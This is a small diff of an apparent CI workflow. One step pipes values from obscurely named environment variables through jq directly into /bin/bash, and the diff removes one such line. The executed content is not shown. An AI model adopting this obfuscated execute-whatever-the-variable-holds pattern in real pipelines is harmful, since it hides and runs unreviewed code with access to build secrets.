@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$lxi94" | jq -r .zzkjc73 | /bin/bash
           echo $syrd77 | jq -r .w695 | /bin/bash
-          echo $h47958 | jq -r .pzkyr0 | /bin/bash
           echo $mvu9 | jq -r .yygwb143 | /bin/bash
 
       - name: Archive data
